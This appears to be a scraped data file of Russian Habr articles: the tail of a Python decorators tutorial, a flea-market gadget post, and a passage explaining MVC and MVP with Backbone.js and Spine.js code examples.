    def _cls_bind_call(self, owner, *args, **kwargs):
        print(""Вызов classmethod"")
        return self._function(owner, *args, **kwargs)

    def _self_bind_call(self, instance, *args, **kwargs):
        print(""Вызов метода инстанса класса"")
        return self._function(instance, *args, **kwargs)

    def _call(self, *args, **kwargs):
        print(""Вызов остальных функций"")
        return self._function(*args, **kwargs)
Создадим тестовые объекты.
@FooDecorator
def foo(*args, **kwargs):
    print(args, kwargs)


class Foo:
    @staticmethod
    @FooDecorator
    def static_method(*args, **kwargs):
        print(args, kwargs)

    @classmethod
    @FooDecorator
    def class_method(cls, *args, **kwargs):
        print(args, kwargs)

    @FooDecorator
    def method(self, *args, **kwargs):
        print(args, kwargs)
Проверяем, что все работает.
foo(1)
# Вызов остальных функций
# (1,) {}
# Получаем ожидаемое значение

Foo.static_method(1)
# Вызов остальных функций
# (1,) {}
# Получаем ожидаемое значение

Foo.class_method(1)
# Вызов classmethod
# (1,) {}
# Получаем ожидаемое значение

foo_instance.method(1)
# Вызов метода экземпляра класса
# (1,) {}
# Получаем ожидаемое значение
Работа с сигнатурой функции
Чаще всего если вам нужно взаимодействовать с сигнатурой функции, вы решаете одну из следующих задач:
Валидация типов
Прокидывание аргументов
Кэширование результата на основе входных параметров
Что касается первой задачи, в виду сложности самостоятельной реализации рекомендую просто использовать уже написанные и проверенные инструменты, например pydantic.validate_call.
Вторая задача чаще требует специфической реализации, поэтому, думаю, стоит привести пример того, как это может выглядеть.
Далее приведены утилиты, альтернативу которых вы могли видеть в тех или иных сторонних библиотеках, но чаще всего я использую именно этот код.
Для справки документация библиотеки inspect.
Код утилит, которые мы будем использовать далее




















































































































































































Теперь, когда у нас есть все необходимое, давайте рассмотрим несколько прикладных примеров.
Если вы работаете с веб фреймворками у вас достаточно часто может стоять задача получения каких либо значений из контекста запроса, например получение пользователя, его id или самого объекта запроса, в большинстве случаев задача решается посредством использования contextvars.ContextVar.
В рамках текущей статьи опустим делали реализации контекста запроса и представим, что у нас есть ряд функций, возвращающих нам из контекста необходимые данные, назовем их следующим образом get_current_user, get_current_user_id, get_current_request.
Наша задача заключается в том, чтобы передавать значения из контекста при вызове функции, если в самом вызове уже не указано какое-либо значение.
Давайте напишем декоратор, который будет реализовывать такую логику.
Для справки ссылка на документацию fastapi.Depends, упомянутую ниже
T = TypeVar(""T"")

# Функция, которая будет аннотировать наш класс, как любой другой,
# переданный входным параметром
def mixin_for(_: T) -> T:
    return object

# Класс, который мы будем использовать в качестве значения по умолчанию,
# если хотим вставить значение из контекста
class CURRENT(mixin_for(Any)): ...


# Для примера напишем функцию, которая будет возвращать фэйковые данные
def get_current_user_id():
    return 1

# Маппинг параметров, значения которых мы будем подменять результатом
# выполнения функции, являющейся значением
# Вы также можете организовать логику так, чтобы не зависеть от имени 
# параметра, основываться только на аннотации
# Такого рода реализацию можно подглядеть например в fastapi.Depends
_CURRENT_MAPPING = {""user_id"": get_current_user_id}


def bind_current(target: Callable = None, **mapping: str) -> Callable:
    """"""Вставляет значения из контекста, если дефолтным значением
    параметра является класс CURRENT

    Args:
        target: целевая функция
        **mapping: словарь, где ключами являются ключи словаря
                  _CURRENT_MAPPING, а значениями имена параметров 
                  в сигнатуре функции

    Returns:
        Callable: декорированная функция или декоратор

    """"""
    def decorator(function: Callable) -> Callable:
        @wraps(function)
        def wrapper(*args, **kwargs):
            # получаем параметры сигнатуры декорируемой функции
            parameters = inspect.signature(function).parameters
            # итерируемся по ключам и значением словаря, с параметрами, 
            # которые можно получить из контекста
            for key, value in _CURRENT_MAPPING.items():
                # если ключ есть в маппинге, переопределяем ключ
                if key in mapping:
                    key = mapping[key]

                # проверяем наличие ключа в параметрах функции
                if not key in parameters:
                    continue
                
                # получаем значение параметра
                parameter_value = get_params_values(
                    function,
                    *args,
                    params=[key],
                    **kwargs
                )[0] 
                
                # проверяем, что значением параметра является CURRENT
                if parameter_value is not CURRENT:
                    continue
                    
                # заменяем значение результатом выполнения функции
                # из словаря _CURRENT_MAPPING
                args, kwargs = replace_params_values(
                    {key: value()}, 
                    function,
                    *args,
                    **kwargs
                )

            # вызываем функцию с модифицированными аргументами
            return function(*args, **kwargs)

        return wrapper

    # если декоратор вызывался с параметрами, возвращаем декоратор
    if target is None:
        return decorator
    # иначе возвращаем декорированную функцию
    return decorator(target)
Пример использования:
@bind_current
def process_user_id_from_request(user_id: int = CURRENT):
    print(user_id)

# Попробуем передать значение id
process_user_id_from_request(2)
# process_user_id_from_request(2)
# 2
# Получаем ожидаемое поведение

# Попробуем не передавать значение id
# process_user_id_from_request()
# 1
# Ожидаемо получаем результат выполнения функции get_current_user_id
Теперь давайте рассмотрим третий кейс. Попробуем использовать кэширование результатов на основе переданных параметров.
Для простоты в примере в качестве хранилища кэша я буду использовать словарь, и не буду брать в расчет срок его хранения, но на практике, конечно, стоит использовать redis или другие аналоги, и позаботиться о своевременной его очистке.
Напишем декоратор, который удовлетворяет описанным выше условиям.
_cache = {}

def _key_func(*args: Any, **kwargs: Any) -> str:
    # Тут может быть любая функция, которая создает строковый ключ
    # на основании переданных аргументов
    key = args
    if kwargs:
        key += tuple(sorted(kwargs.items()))
    return base64.b64encode(pickle.dumps(key)).decode(""utf-8"")

  
def cache_decorator(*params: str) -> Callable:
    # Декоратор, который будет записывать кэш на основе переданных 
    # значений параметров, указанных в params
    def decorator(function: Callable) -> Callable:
        # Функция для получения ключа из параметров
        def _get_key(*args, **kwargs):
            # Тут мы получаем словарь со значениями параметров, 
            # указанных в params
            args_values = get_params_with_values(
                inspect.unwrap(function), 
                *args,
                params=params,
                **kwargs
            )
            # Возвращаем ключ, созданный на основании переданных параметров
            return str(_key_func(**args_values))

        # Функция для получения значений из кэша
        def _get_cached(*args, **kwargs):
            # Получаем ключ
            key = _get_key(*args, **kwargs)
            # Проверяем наличие данных в кэше
            if key in _cache:
                print(""Получено из кэша"")
                # Получаем результат из кэша и преобразуем в объекты python
                return pickle.loads(_cache.get(key))
            return None

        # Функция для сохранения результата в кэш
        def _save_result(key, result):
            # Преобразуем результат в байты
            data = pickle.dumps(result)
            # Записываем в кэш результат
            _cache[key] = data

        @wraps(function)
        def wrapper(*args, **kwargs):
            # Пробуем получить данные из кэша
            if cached := _get_cached(*args, **kwargs):
                return cached
            # Если данных нет в кэше вызываем функцию
            result = function(*args, **kwargs)
            print(""Произошел вызов декорированной функции"")
            # Сохраняем результат в кэш
            _save_result(_get_key(*args, **kwargs), result)
            # Возвращаем результат
            return result

        return wrapper
    return decorator
Пример использования:
@cache_decorator(""a"", ""b"")
def multiplication(a: int | float, b: int | float, other_param: bool = False):
    return a * b

# Попробуем выполнить функцию с одними и теми же параметрами несколько раз
# Первый вызов
# multiplication(2, 3)
# Произошел вызов декорированной функции
# 6

# Второй вызов
# multiplication(2, 3)
# Получено из кэша
# 6

# Теперь проверим, что параметр other_param берет значение из 
# кэша по тому же самому ключу
# multiplication(2, 3, True)
# Получено из кэша
# 6

# А теперь попробуем заменить значение a
# multiplication(3, 3)
# Произошел вызов декорированной функции
# 9
# Получаем ожидаемое поведение
Заключение
В данной статье мы глубже погрузились в тему декораторов, разобрали где и зачем их можно и стоит использовать и рассмотрели несколько прикладных примеров.
Надеюсь материал окажется полезным для многих и вы найдете, что-то новое по теме для себя. Всегда рад любым комментариям особенно тем, что помогут улучшить качество следующих статей."
"Воскресная барахолка — NAS-сервер, роботы-пылесосы, аудиоаппаратура и кое-что еще",https://habr.com/ru/companies/selectel/articles/910408/,"Привет, Хабр! В который раз выбираюсь на испанскую барахолку под Валенсией. Сейчас хорошая погода, и все больше продавцов выходят на блошиный рынок, предлагая свои товары посетителям. Я в этот раз вид...","Привет, Хабр! В который раз выбираюсь на испанскую барахолку под Валенсией. Сейчас хорошая погода, и все больше продавцов выходят на блошиный рынок, предлагая свои товары посетителям. Я в этот раз видел больше обычного интересных гаджетов, некоторые из них купил, остальные сфотографировал, чтобы показать вам. И, как всегда, среди них есть загадочные вещи, предназначение которых давайте угадывать вместе. Поехали.

Что попалось интересного

Началась барахолка вот с этого дрона -это явно китайский недорогой девайс. Тем не менее, пару раз я подобные покупал и все отлично работало. Потом, наигравшись, отдавал знакомым и друзьям.



Nintendo Wii, картридж вроде как для Nintendo, и выше — оригигнальные контроллеры для PS4. Сбоку справа — камера Polaroid. В общем, интересный продавец.



Становится все больше роботов-пылесосов. Вот, например, какой-то совсем бюджетный ноунейм, потом Conga, более профессиональный.



А еще — iRobot Roomba, это 700-я линейка. Я уже их не покупаю, слишком много у меня роботов- пылесосов. Жаль их, конечно, поскольку большая часть — в рабочем состоянии или нуждается в минимальном ремонте.



Две очень крутые клавиатуры. Мне приглянулась верхняя, от Logitech, а потом я увидел, что у нее странная раскладка. Это вроде французская, но я могу и ошибаться. В целом, я печатаю вслепую, но все же не купил. Посмотрел в интернете — девайс недешевый. Насколько понимаю, это Bluetooth, поскольку места, где размещается обычно адаптер, не нашел.



Вторая клавиатура — с ипанской раскладкой и тачпадом. Но ее тоже не стал покупать.



Затем попалась материнская плата от Acer, вроде 5000-я линейка, но я могу и ошибаться. Скорее всего, кто-то разломал ноутбук, а материнка в рабочем состоянии. я уже такое встречал.



Пачка древних жестких дисков по 160-80 ГБ.



Потом попался классный винтажный ноутбук Sony Vaio. Это 17-дюймовый. Мне они очень нравятся. Но увы, уже вряд ли для чего-то его можно приспособить. Характеристики (типичные для этой серии):

Процессор Intel Core 2 Duo.
Дискретная графика NVIDIA GeForce.
Экран 16.4"" с разрешением 1600x900 или 1920x1080 (Full HD).
HDMI, FireWire, ExpressCard, кардридер, Blu-ray привод.



Несколько старых приводов для десктопов, от картридера до DVD-RW.


Какая-то система наблюдения.



На фото — комплект от GeoVision, производителя систем видеонаблюдения. Это цифровая плата видеозахвата (DVR board), которая вставляется в компьютер и позволяет подключать аналоговые камеры видеонаблюдения. Это очень старая система (ориентировочно 2005–2008 года).



Она используется с фирменным ПО GeoVision Surveillance System, позволяющим:

записывать видео с нескольких каналов (обычно 4, 8, 16),
использовать детекцию движения,
управлять камерами,
вести архивы.


Потом еще система для дома, причем явно работающая. Это eedomus box — контроллер умного дома (smart home hub) от французской компании. Используется для управления датчиками, термостатами, замками, лампами и т.д., поддерживает Z-Wave. Плюс ермостат или климатический контроллер, вероятно, для умного дома или системы отопления. На дисплее: температура, влажность, символ «домика».



Потом мне попалось сразу много разного аудиооборудования. Внизу на фотографии DIGIMASTER Preamplifier Mixer MMX-850. Это аналоговый DJ-микшер с цифровым сэмплером, ориентировочно из конца 90-х – начала 2000-х годов. Он предназначен для микширования аудиосигналов с разных источников (проигрыватели, CD, микрофоны) и содержит:

4 канала (CH1–CH4) с отдельными фейдерами,
цифровой сэмплер на 4/8 секунд (Digital Sampler),
2 микрофонных входа,
эквалайзер, кроссфейдер и эффекты (Assign Effect),
выходы на наушники и RCA.

Выше — Fonestar SM-1250, старый аудио-микшер или усилитель с регуляторами громкости по входам, используется в основном в ретро-аудиосистемах (радио/кассетники/усилители).


Электронный аккордеон Magnus Electric Chord Organ, выпускавшийся в США примерно с 1950-х по 1970-е годы. Что это за инструмент:

Производитель: Magnus Harmonica Corporation (позже Magnus Organ Corporation).
Тип: Электронный орган (на самом деле внутри — электровоздушный: использует вентилятор и язычковые механизмы).
Клавиши: 22 клавиши для мелодии.
Слева — кнопки аккордов: C, D, E, F, G, A, B и их минорные варианты — на них можно играть аккомпанемент.



На фото ниже — M-Audio X-Session Pro — это USB MIDI-контроллер для диджеев и музыкантов. Он не воспроизводит звук сам по себе, а управляет DJ/DAW программами (например, Ableton Live, Traktor, Serato, VirtualDJ и др.). Подключается через USB, определяется как MIDI-устройство.



Дальше встретились седла и подковы. Какую-то конюшню ограбили, что ли.





Еще попался древний десктоп от Lenovo. Вероятно, до сих пор можно применять, как печатную машинку.



Затем — целая куча пультов, объективов и фотоаппаратов. Плюс старые телефоны и много всего еще.



Здесь несколько телефонов. Один из них, Ericsson, я купил. Это Ericsson T28s из 1999 года:
Один из самых тонких телефонов своего времени (всего 83 г),
Выдвижная антенна,
Открывающаяся нижняя крышка (flip),
Маленький монохромный дисплей,
Поддержка SMS и базовых звонков (GSM 900/1800).



Что я купил

Главное, чем можно похвастаться, это WD My Book Duo. Без дисков, но рабочий девайс! Купил всего за 5 евро. Характеристики:
Два USB 3.0 порта (Type-A) — могут использоваться как USB-хаб.
Один USB 3.1 Type-C (или micro-B) — основной интерфейс подключения к компьютеру (обозначен как TO PC).
Питание: 12 Вольт (DC IN 12V) — внешний адаптер.
Поддержка RAID 0/1 или JBOD — можно настроить либо на производительность (RAID 0), либо на надёжность (RAID 1).
Объём может быть от 4 до 36 ТБ, в зависимости от модели и установленного конфигурацией накопителя.





И еще сдвоенное питание для некоего то ли очень мощного ноутбука, то ли ноутбука и внешней карты, ASUS. Проверил, оба адаптера рабочие. Кто знает, что это, подскажите.





Еще купил виртуальную стену для робота пылесоса iRobot, новые версии, плюс зарядную станцию для него же. Всего в 5 евро обошлось все это счастье.

Что это за штука?

И, конечно, мне попались разные всякие штуки, назначение которых мне не совсем ясно. Давайте разбираться вместе.

1. Что-то для общения, вроде как.



2. Тоже нечто для разговоров, во всяком случае, есть микрофон.



3. Нечто медицинское.



4. Представления не имею, что это и для чего.



Ну а на этом все, не переключайтесь!"
Понимание MVC и MVP (для разработчиков JavaScript и Backbone),https://habr.com/ru/articles/910074/,"Прежде чем изучать какие-либо JavaScript-фреймворки, помогающие в структурировании приложений, может быть полезно получить базовое представление об архитектурных шаблонах проектирования. Шаблоны проек...","Прежде чем изучать какие-либо JavaScript-фреймворки, помогающие в структурировании приложений, может быть полезно получить базовое представление об архитектурных шаблонах проектирования. Шаблоны проектирования являются проверенными решениями распространенных проблем разработки и могут предложить структурные парадигмы, которые помогут нам организовать наше приложение.
Я думаю, паттерны очень интересны, поскольку они фактически представляют собой массовые усилия, опирающиеся на коллективный опыт опытных разработчиков, которые ранее сталкивались с теми же проблемами, с которыми сталкиваемся мы сейчас. Хотя разработчики 10 или 20 лет назад, возможно, не использовали те же языки программирования для реализации паттернов, мы можем извлечь из их усилий много уроков.
В этом разделе мы рассмотрим два популярных шаблона – MVC и MVP. Контекст нашего исследования будет заключаться в том, как эти шаблоны связаны с популярным фреймворком JavaScript Backbone.js, который будет рассмотрен более детально позже.
MVC
MVC (Модель-Представление-Контроллер, Model-View-Controller) – это архитектурный шаблон проектирования, который способствует улучшению организации приложения за счет разделения задач. Это обеспечивает изоляцию бизнес-данных (Models) от пользовательских интерфейсов (Views), при этом третий компонент (Controllers) (традиционно) управляет логикой, пользовательским вводом и координирует как модели (Models), так и представления (Views). Первоначально шаблон был разработан Трюгве Ренскаугом во время его работы над Smalltalk-80 (1979), где он изначально назывался Model-View-Controller-Editor. Затем MVC был подробно описан в 1994году в книге «Шаблоны проектирования: элементы переиспользуемого объектно-ориентированного программного обеспечения» («Design patterns: elements of reusable object-oriented software») (книга GoF, или «Банда четырех»), которая сыграла свою роль в популяризации его использования.
Smalltalk-80 MVC
Важно понимать, на решение каких проблем был направлен исходный шаблон MVC, поскольку он довольно сильно видоизменился со времен своего появления. В 70-е годы графические пользовательские интерфейсы были еще редки, и концепция, известная как «разделенное представление», начала использоваться как средство для четкого разделения между объектами предметной области, которые моделировали концепции реального мира (например, фотография, человек), и объектами представления, которые отображались на экране пользователя.
Реализация MVC в Smalltalk-80 развила эту концепцию и преследовала цель отделить логику приложения от пользовательского интерфейса. Идея заключалась в том, что разделение этих частей приложения также позволит переиспользовать модели для других интерфейсов в приложении. Есть несколько интересных моментов, которые стоит отметить в архитектуре MVC в Smalltalk-80:
Элемент предметной области (Domain element) был известен как Модель и не имел представления о пользовательском интерфейсе (Представлениях и Контроллерах).
Отображение было организовано Представлением и Контроллером, но не было просто одного представления и контроллера. Пара Представление-Контроллер требовалась для каждого элемента, отображаемого на экране, и поэтому между ними не было настоящего разделения.
Роль Контроллера в этой паре заключалась в обработке пользовательского ввода (такого, как нажатия клавиш и клики мышью), делая с ним что-то полезное.
Шаблон «Наблюдатель» (Observer pattern) использовался для обновления представления всякий раз, когда изменялась Модель.
Разработчики иногда удивляются, когда узнают, что шаблон «Наблюдатель» (в настоящее время обычно реализуемый как система «Издатель»/«Подписчик» (Publish/Subscribe)) был включен как часть архитектуры MVC много десятилетий назад. В MVC Smalltalk-80 Представление и Контроллер наблюдают за Моделью. Как упоминалось выше, каждый раз, когда изменяется Модель, реагируют Представления. Простым примером этого является приложение, основанное на данных фондового рынка: чтобы приложение было полезным, любое изменение данных в наших Моделях должно приводить к мгновенному обновлению Представления.
Мартин Фаулер проделал превосходную работу, описывая историю становления MVC, и если вам интересна дополнительная историческая информация о MVC Smalltalk-80, я рекомендую прочитать его работу.
MVC для разработчиков JavaScript
Мы рассмотрели 70-е, но давайте теперь вернемся к настоящему. В наше время шаблон MVC применяется к широкому диапазону языков программирования, включая наиболее актуальный для нас: JavaScript. Теперь у JavaScript есть ряд фреймворков, которые могут похвастаться поддержкой MVC (или его вариаций, которые мы называем семейством MV*), позволяющего разработчикам легко добавлять структуру в свои приложения без особых усилий. Вы, вероятно, сталкивались по крайней мере с одним из этих фреймворков, но они включают в себя такие, как Backbone, Ember.js и JavaScriptMVC. Учитывая важность избегания «спагетти»-кода (термин, описывающий код, который очень сложно читать или поддерживать из-за отсутствия структуры), важно, чтобы современный JavaScript-разработчик понимал, чем полезен этот шаблон. Мы можем эффективно оценить, что эти фреймворки позволяют нам делать по-другому.
Мы знаем, что MVC состоит из трех основных компонентов:
Модели (Models)
Модели управляют данными для приложения. Они не зависят от слоев пользовательского интерфейса или представления, но, вместо этого, представляют уникальные формы данных, которые могут потребоваться приложению. Когда модель изменяется (например, обновляется), она, как правило, уведомляет своих наблюдателей (например, представления, концепцию которых мы вскоре рассмотрим), что произошло изменение, чтобы они могли отреагировать соответствующим образом.
Чтобы понять модели лучше, представим, что у нас есть JavaScript-приложение фотогалереи. В фотогалерее концепция фотографии заслуживает собственную модель, поскольку она представляет собой уникальный вид данных конкретной предметной области. Такая модель может содержать связанные атрибуты, такие как подпись, источник изображения и дополнительные метаданные. Конкретная фотография будет храниться в экземпляре модели, а модель также может быть повторно использована. Ниже мы можем видеть пример очень упрощенной модели, реализованной с помощью Backbone.
var Photo = Backbone.Model.extend({

    // Default attributes for the photo
    defaults: {
      src: ""placeholder.jpg"",
      caption: ""A default image"",
    viewed: false
    },

    // Ensure that each photo created has an `src`.
    initialize: function() {
       this.set({""src"": this.defaults.src});
    }

});
Встроенные возможности моделей различаются в зависимости от фреймворка, однако они довольно часто поддерживают проверку атрибутов, где атрибуты представляют свойства модели, такие как идентификатор модели. При использовании моделей в реальных приложениях мы обычно также хотим сохранения модели. Сохранение позволяет нам редактировать и обновлять модели, зная, что их последнее состояние будет сохранено либо в памяти, либо в хранилище данных пользователя localStorage, либо синхронизировано с базой данных.
Кроме того, у модели может также быть несколько представлений, наблюдающих за ней. Если, скажем, наша модель фото содержит метаданные, такие как геометка (долгота и широта), друзья, запечатленные на фотографии (список идентификаторов) и список тегов, разработчик может решить предоставить единое представление, чтобы отобразить каждый из этих трех аспектов.
Нередко современные MVC/MV*-фреймворки предоставляют средства для группировки моделей (например, в Backbone эти группы называются «коллекциями»). Управление моделями в группах позволяет нам писать логику приложения, основанную на уведомлениях от группы, если какая-либо модель в ней будет изменена. Это избавляет от необходимости вручную отслеживать отдельные экземпляры модели.
Пример группировки моделей в упрощенную коллекцию Backbone можно увидеть ниже.
var PhotoGallery = Backbone.Collection.extend({

    // Reference to this collection's model.
    model: Photo,

    // Filter down the list of all photos 
    // that have been viewed
    viewed: function() {
        return this.filter(function(photo){ 
           return photo.get('viewed'); 
        });
    },

    // Filter down the list to only photos that 
    // have not yet been viewed
    unviewed: function() {
      return this.without.apply(this, this.viewed());
    }

});
Представления (Views)
Представления – это визуальное отображение моделей, которые обеспечивают настроенное представление их текущего состояния. Представление обычно наблюдает за моделью и получает уведомление когда модель изменяется, что позволяет представлению обновляться соответствующим образом. В литературе по шаблонам проектирования представления обычно называют «глупыми», поскольку их знания о моделях и контроллерах в приложении ограничены.
Пользователи могут взаимодействовать с представлениями, и это включает возможность читать и редактировать (т. е. получать или задавать значения атрибутов) модели. Поскольку представление является уровнем отображения, мы обычно предоставляем возможность редактирования и обновления в удобном для пользователя виде. Например в предыдущем приложении фотогалереи, которое мы обсуждали ранее, редактирование модели можно было бы упростить с помощью представления «редактирования», где пользователь, выбравший определенную фотографию, мог бы редактировать ее метаданные.
Настоящая задача обновления модели ложится на контроллеры (о которых мы вскоре поговорим).
Давайте рассмотрим представления немного подробнее, с помощью реализацию примера на «ванильном» JavaScript. Ниже мы можем видеть функцию, которая создает единое представление Photo, используя экземпляр модели и экземпляр контроллера.
Мы определяем в нашем представлении утилиту render(), которая отвечает за рендер содержимого photoModel , используя шаблонизатор JavaScript (шаблоны Underscore), и обновление содержимого нашего представления, на которое ссылается photoEl.
Затем photoModel добавляет наш обратный вызов render() в качестве одного из своих подписчиков, чтобы с помощью шаблона «Наблюдатель» мы могли инициировать обновление представления при изменении модели.
Вы можете задаться вопросом, где здесь взаимодействие с пользователем. Когда пользователи нажимают на какие-либо элементы в представлении, представление не обязано знать, что делать дальше. Оно полагается на контроллер, который принимает это решение. В нашей реализации примера это достигается путем добавления слушателя событий к photoEl, который делегирует обработку поведения клика обратно контроллеру, передавая вместе с ней информацию о модели, если она необходима.
Преимущество этой архитектуры в том, что каждый компонент играет свою отдельную роль, обеспечивая функционирование приложения по мере необходимости.
var buildPhotoView = function( photoModel, photoController ){

    var base        = document.createElement('div'),
        photoEl     = document.createElement('div');

     base.appendChild(photoEl);

     var render= function(){
        // We use a templating library such as Underscore
        // templating which generates the HTML for our 
        // photo entry
        photoEl.innerHTML = _.template('photoTemplate', {src: photoModel.getSrc()});
     }

     photoModel.addSubscriber( render );

     photoEl.addEventListener('click', function(){
        photoController.handleEvent('click', photoModel );
     });

     var show = function(){
        photoEl.style.display  = '';
     }

     var hide = function(){
        photoEl.style.display  = 'none';
     }


     return{
        showView: show,
        hideView: hide
     }

}
Templating
В контексте фреймворков JavaScript, поддерживающих MVC/MV*, стоит кратко обсудить шаблонизацию JavaScript и ее связь с представлениями, так как мы затронули ее в предыдущем разделе.
Долгое время считалось (и было доказано), что создание вручную больших блоков HTML-разметки в памяти с помощью конкатенации строк приводит к снижению производительности. Разработчики, которые так поступали, стали жертвами неэффективной итерации из-за данных, обернутых во вложенные div'ы, и из-за использования устаревших методов, таких как document.write, для добавления «шаблона» в DOM. Поскольку это обычно означает приведение скриптовой разметки в соответствие со стандартной разметкой, она может быстро стать трудночитаемой и, что более важно, ее станет сложно поддерживать в рабочем состоянии, особенно при создании приложений нетривиального размера.
Решения для шаблонизации JavaScript (такие как Handlebars.js и Mustache) часто используются чтобы определить шаблоны для представлений как разметку (хранящейся либо внешне, либо внутри тегов скрипта с пользовательским типом – например, text/template), содержащую переменные шаблона. Переменные могут быть разделены с помощью синтаксиса переменных (например), а фреймворки обычно достаточно умны, чтобы принимать данные в формате JSON (в который можно преобразовать экземпляры моделей), так что нам нужно беспокоиться только о поддержании чистых моделей и чистых шаблонов. Большую часть рутинной работы по заполнению берет на себя сам фреймворк. У этого подхода множество преимуществ, особенно при выборе внешнего хранения шаблонов, поскольку позволяет динамически загружать шаблоны по мере необходимости при создании более крупных приложений.
Ниже мы видим два примера HTML-шаблонов. Один реализован с использованием популярного фреймворка Handlebars.js, а другой – с использованием шаблонов Underscore.
Handlebars.js:
<li class=""photo"">
  <h2></h2>
  <img class=""source"" src=""""/>
  <div class=""meta-data""> 
    
  </div>
</li>
Underscore.js Microtemplates:
<li class=""photo"">
  <h2><%= caption %></h2>
  <img class=""source"" src=""<%= src %>""/>
  <div class=""meta-data""> 
    <%= metadata %>
  </div>
</li>
Также стоит отметить, что в классической веб-разработке навигация между независимыми представлениями требовала обновления страницы. Однако в одностраничных приложениях JavaScript после того, как данные передаются с сервера через Ajax, их можно просто динамически отобразить в новом представлении на той же странице без необходимости в таком обновлении. Таким образом, роль навигации отводится «маршрутизатору» (Router), который помогает управлять состоянием приложения (например, позволяя пользователям добавлять в закладки определенное представление, к которому они перешли). Однако, поскольку маршрутизаторы не являются частью MVC и не присутствуют ни в одном MVC-подобном фреймворке, я не буду рассматривать их более подробно в этом разделе.
Итак, представления – это визуальное отображение данных нашего приложения.
Контроллеры (Controllers)
Контроллеры являются посредниками между моделями и представлениями, классически отвечают за две задачи: обновляют представление при изменении модели и обновляют модель, когда пользователь взаимодействует с представлением.
В нашем приложении фотогалереи контроллер будет отвечать за обработку изменений, которые внесет пользователь в представление при редактировании конкретной фотографии, и обновление модели этой фотографии после того, как пользователь закончит редактирование.
Однако большинство фреймворков JavaScript отходят от традиционного понимания контроллеров, принятого в MVC. Есть разные причины этого, но, по моему мнению, авторы фреймворков изначально смотрят на «серверную» сторону MVC, понимают, что она не транслируется 1:1 на сторону клиента и переосмысливают «C» в MVC, чтобы обозначить то, что, по их мнению, имеет больше смысла. Однако проблема в том, что это субъективно и усложняет как понимание классического шаблона MVC, так и, конечно, роли контроллеров в современных фреймворках.
В качестве примера давайте кратко рассмотрим архитектуру популярного архитектурного фреймворка Backbone.js. В Backbone есть модели и представления (несколько похожие на те, что мы рассматривали ранее), однако на самом деле у него нет настоящих контроллеров. Его представления и маршрутизаторы действуют немного похоже на контроллер, но ни один из них не является контроллером сам по себе.
В этом отношении, вопреки тому, что может быть упомянуто в официальной документации или в сообщениях блога, Backbone не является ни настоящим MVC/MVP, ни MVVM-фреймворком. На самом деле лучше считать его членом семейства MV*, которое подходит к архитектуре по-своему. Конечно, в этом нет ничего плохого, но важно различать классический MVC и MV*, если вы полагаетесь на советы из классической литературы по первому, чтобы использовать его во втором.
Контроллеры в Spine.js против Backbone.js
Spine.js
Теперь мы знаем, что контроллеры традиционно отвечают за обновление представления при изменении модели (и аналогично за модель, когда пользователь обновляет представление). Поскольку фреймворк, который мы будем обсуждать в этой книге (Backbone), не имеет собственных явных контроллеров, нам может быть полезно рассмотреть контроллер из другого фреймворка MVC, чтобы оценить разницу в реализациях. Для этого давайте рассмотрим пример контроллера из Spine.js.
В этом примере у нас будет контроллер под названием PhotosController, который будет отвечать за отдельные фотографии в приложении. Это гарантирует, что при обновлении представления (например, когда пользователь редактирует метаданные фотографии) соответствующая модель также обновится.
Примечание: мы не будем углубляться в Spine.js, а просто кратко рассмотрим, что могут делать его контроллеры:
// Controllers in Spine are created by inheriting from Spine.Controller

var PhotosController = Spine.Controller.sub({      
  init: function(){
    this.item.bind(""update"", this.proxy(this.render));
    this.item.bind(""destroy"", this.proxy(this.remove));
  },

  render: function(){
    // Handle templating
    this.replace($(""#photoTemplate"").tmpl(this.item));
    return this;
  },

  remove: function(){
    this.el.remove();
    this.release();
  }
});
В Spine контроллеры считаются связующим звеном для приложения, добавляя события DOM и реагируя на них, отображая шаблоны и обеспечивая синхронизацию представлений и моделей (что имеет смысл в контексте того, что мы называем контроллером).
В приведенном выше примере мы настраиваем слушателей в событиях update и remove с помощью render() и remove(). Когда запись о фото обновлена, мы повторно рендерим представление, чтобы отразить изменения в метаданных. Аналогично, если фотография удаляется из галереи, мы удаляем ее из представления. Если вам интересно, что такое функция tmpl() во фрагменте кода: в функции render() мы используем ее для рендеринга шаблона JavaScript с именем #photoTemplate, который просто возвращает строку HTML, используемую для замены текущего элемента контроллера.
Это дает нам очень легкий и простой способ управления изменениями между моделью и представлением.
Backbone.js
Далее в этом разделе мы вернемся к различиям между Backbone и традиционным MVC, но сейчас давайте сосредоточимся на контроллерах.
В Backbone ответственность контроллера делится между Backbone.View и Backbone.Router. Некоторое время назад Backbone поставлялся со своим собственным Backbone.Controller, но поскольку название этого компонента не имело смысла в контексте, в котором он использовался, позже он был переименован в Router.
Маршрутизаторы берут на себя немного больше ответственности контроллера, поскольку можно привязать события к моделям и заставить представление реагировать на события DOM и рендеринг. Как ранее отметил Тим Браньен (еще один участник Backbone на базе Bocoup), для этого можно обойтись вообще без Backbone.Router, поэтому, вероятно, можно представить это с помощью парадигмы Router так:
var PhotoRouter = Backbone.Router.extend({
  routes: { ""photos/:id"": ""route"" },

  route: function(id) {
    var item = photoCollection.get(id);
    var view = new PhotoView({ model: item });

    something.html( view.render().el );
  }
}):
Подводя итог этого раздела, можно сделать вывод, что контроллеры управляют логикой и координацией между моделями и представлениями в приложении.
Что нам дает MVC?
Такое разделение задач в MVC упрощает модуляризацию функциональности приложения и позволяет:
Более простое общее обслуживание. Когда необходимо внести обновления в приложение, становится совершенно ясно, касаются ли изменения данных, то есть изменения моделей и, возможно, контроллеров, или же они чисто визуальные, то есть имеем дело с измененим представлений.
Разделение моделей и представлений означает, что писать модульные тесты для бизнес-логики становится значительно проще.
Дублирование кода низкоуровневой модели и контроллера (то есть того, что вы могли использовать вместо этого) устраняется во всем приложении.
В зависимости от размера приложения и разделения ролей эта модульность позволяет разработчикам, отвечающим за основную логику, и разработчикам, работающим над пользовательскими интерфейсами, работать одновременно.
Копаем глубже
На данный момент у вас, скорее всего, есть базовое представление о том, что обеспечивает шаблон MVC, но для любознательных мы можем рассмотреть его немного подробнее.
В GoF (Gang of Four) авторы не называют MVC шаблоном проектирования, а скорее считают его «набором классов для построения пользовательского интерфейса». По их мнению, это на самом деле вариация трех других классических шаблонов проектирования: шаблонов «Наблюдатель» («Издатель»/«Подписчик»), «Стратегия» и «Компоновщик» (Observer (Pub/Sub), Strategy, Composite). В зависимости от того, как MVC был реализован в фреймворке, он также может использовать шаблоны «Фабрика» (Factory) и «Декоратор» (Decorator). Я рассмотрел некоторые из этих шаблонов в моей другой бесплатной книге, «JavaScript Design Patterns For Beginners», если вы хотите почитать о них подробнее.
